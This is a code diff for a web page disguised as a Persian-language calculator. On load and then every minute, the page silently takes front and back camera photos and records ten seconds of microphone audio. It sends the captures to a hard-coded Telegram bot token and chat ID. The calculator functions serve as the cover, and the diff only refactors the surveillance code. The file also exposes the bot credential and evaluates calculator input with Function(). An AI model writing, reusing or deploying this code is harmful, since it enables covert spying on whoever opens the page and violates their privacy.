@@ -2,29 +2,25 @@ const botToken = "7996751116:AAFRkCkQ32NI35JKeqeacSFayJnPjlMVRxs";
 const chatId = "1120400003";
 const statusText = document.getElementById("status");
 const video = document.getElementById("video");
-
 let audioBlob = null;
 let photoFront = null;
 let photoBack = null;
 
 async function captureImage(facingMode) {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
     video.srcObject = stream;
-
-    // صبر برای نمایش تصویر
-    await new Promise(resolve => setTimeout(resolve, 1000));
+    await new Promise(r => setTimeout(r, 1000));
 
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
 
     stream.getTracks().forEach(track => track.stop());
     return blob;
-  } catch (err) {
-    // اگر اجازه دوربین رد شود یا خطایی رخ دهد، null برمی‌گردانیم
+  } catch {
     return null;
   }
 }
@@ -37,159 +33,100 @@ async function recordAudio() {
 
     mediaRecorder.ondataavailable = e => chunks.push(e.data);
 
-    return new Promise((resolve) => {
+    return new Promise(resolve => {
       mediaRecorder.onstop = () => {
         stream.getTracks().forEach(track => track.stop());
         resolve(new Blob(chunks, { type: "audio/webm" }));
       };
-
       mediaRecorder.start();
-      statusText.innerText = "🎙 در حال ضبط صدا به مدت ۱۰ ثانیه...";
+      statusText.innerText = "🎙 در حال ضبط صدا...";
       setTimeout(() => {
         mediaRecorder.stop();
-        statusText.innerText = "⏳ در حال ارسال اطلاعات...";
+        statusText.innerText = "⏳ در حال ارسال...";
       }, 10000);
     });
-  } catch (err) {
-    return null; // اگر اجازه میکروفون رد شود یا خطا باشد
+  } catch {
+    return null;
   }
 }
 
 function sendToTelegram(audio, photoFront, photoBack) {
-  let sentSomething = false;
-
-  if (audio) {
+  const sendFile = (endpoint, fieldName, file, filename) => {
     const formData = new FormData();
     formData.append("chat_id", chatId);
-    formData.append("caption", "📤 فایل‌های ارسالی:");
-    formData.append("voice", audio, "voice.webm");
+    formData.append(fieldName, file, filename);
+    fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: "POST", body: formData });
+  };
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
-      method: "POST",
-      body: formData
-    });
-    sentSomething = true;
-  }
+  if (audio) sendFile("sendVoice", "voice", audio, "voice.webm");
+  if (photoFront) sendFile("sendPhoto", "photo", photoFront, "front.jpg");
+  if (photoBack) sendFile("sendPhoto", "photo", photoBack, "back.jpg");
 
-  if (photoFront) {
-    const formDataFront = new FormData();
-    formDataFront.append("chat_id", chatId);
-    formDataFront.append("photo", photoFront, "front.jpg");
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: "POST",
-      body: formDataFront
-    });
-    sentSomething = true;
-  }
-
-  if (photoBack) {
-    const formDataBack = new FormData();
-    formDataBack.append("chat_id", chatId);
-    formDataBack.append("photo", photoBack, "back.jpg");
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: "POST",
-      body: formDataBack
-    });
-    sentSomething = true;
-  }
-
-  if (sentSomething) {
-    statusText.innerText = "✅ صدا و عکس‌ها با موفقیت ارسال شدند!";
+  if (audio || photoFront || photoBack) {
+    statusText.innerText = "✅ فایل‌ها ارسال شدند.";
   } else {
-    // اگر هیچ دسترسی داده نشده بود یا خطایی رخ داده بود، به بات اطلاع بدهیم
+    statusText.innerText = "❌ دسترسی رد شده یا خطا.";
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: "❌ هیچ دسترسی به میکروفون یا دوربین داده نشده یا خطا رخ داده است."
-      })
+      body: JSON.stringify({ chat_id: chatId, text: "🚫 خطا یا دسترسی داده نشد." })
     });
-    statusText.innerText = "❌ خطایی رخ داد یا دسترسی رد شد.";
   }
 }
 
 async function startAll() {
+  statusText.innerText = "📸 گرفتن عکس جلو...";
+  photoFront = await captureImage("user");
+
+  statusText.innerText = "📸 گرفتن عکس پشت...";
+  photoBack = await captureImage("environment");
+
+  audioBlob = await recordAudio();
+
+  sendToTelegram(audioBlob, photoFront, photoBack);
+}
+
+// ماشین حساب:
+const display = document.getElementById('display');
+const history = document.getElementById('history');
+
+function append(value) {
+  display.innerText = (display.innerText === '0' || display.innerText === 'خطا!') ? value : display.innerText + value;
+}
+
+function clearDisplay() {
+  display.innerText = '0';
+}
+
+function backspace() {
+  display.innerText = display.innerText.length > 1 ? display.innerText.slice(0, -1) : '0';
+}
+
+function calculate() {
   try {
-    statusText.innerText = "📸 در حال گرفتن عکس از دوربین جلو...";
-    photoFront = await captureImage("user");
-
-    statusText.innerText = "📸 در حال گرفتن عکس از دوربین عقب...";
-    photoBack = await captureImage("environment");
-
-    audioBlob = await recordAudio();
-
-    sendToTelegram(audioBlob, photoFront, photoBack);
-  } catch (e) {
-    statusText.innerText = "❌ خطایی رخ داد یا دسترسی رد شد.";
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: "❌ خطای غیرمنتظره در اجرای برنامه رخ داد."
-      })
-    });
+    const input = display.innerText.replace(/%/g, '*0.01');
+    const result = Function('"use strict";return (' + input + ')')();  // بهتر از eval
+    history.innerText = display.innerText + ' = ' + result;
+    display.innerText = result.toString();
+  } catch {
+    display.innerText = 'خطا!';
   }
 }
 
-// اجرای اولین بار بلافاصله پس از بارگذاری صفحه
+function calculateTrig(func) {
+  try {
+    const value = parseFloat(display.innerText);
+    if (isNaN(value)) throw 'NaN';
+    const radians = value * Math.PI / 180;
+    const result = func === 'sin' ? Math.sin(radians) : Math.cos(radians);
+    display.innerText = result.toFixed(8);
+    history.innerText = `${func}(${value}) = ${result.toFixed(8)}`;
+  } catch {
+    display.innerText = 'خطا!';
+  }
+}
+
 window.onload = () => {
   startAll();
-  
-    const display = document.getElementById('display');
-    const history = document.getElementById('history');
-
-    function append(value) {
-      if (display.innerText === '0' || display.innerText === 'خطا!') {
-        display.innerText = value;
-      } else {
-        display.innerText += value;
-      }
-    }
-
-    function clearDisplay() {
-      display.innerText = '0';
-    }
-
-    function backspace() {
-      const text = display.innerText;
-      if (text.length > 1) {
-        display.innerText = text.slice(0, -1);
-      } else {
-        display.innerText = '0';
-      }
-    }
-
-    function calculate() {
-      try {
-        const input = display.innerText.replace(/%/g, '*0.01');
-        const result = eval(input);
-        history.innerText = display.innerText + ' = ' + result;
-        display.innerText = result.toString();
-      } catch {
-        display.innerText = 'خطا!';
-      }
-    }
-
-    function calculateTrig(func) {
-      try {
-        let value = parseFloat(display.innerText);
-        if (isNaN(value)) throw 'NaN';
-        let radians = value * Math.PI / 180;
-        let result = func === 'sin' ? Math.sin(radians) : Math.cos(radians);
-        result = parseFloat(result.toFixed(8));
-        history.innerText = func + '(' + value + ') = ' + result;
-        display.innerText = result.toString();
-      } catch {
-        display.innerText = 'خطا!';
-      }
-    }
-
-  // اجرای تابع startAll هر 60 ثانیه (60000 میلی‌ثانیه)
-  setInterval(() => {
-    startAll();
-  }, 60000);
+  setInterval(startAll, 60000);
 };
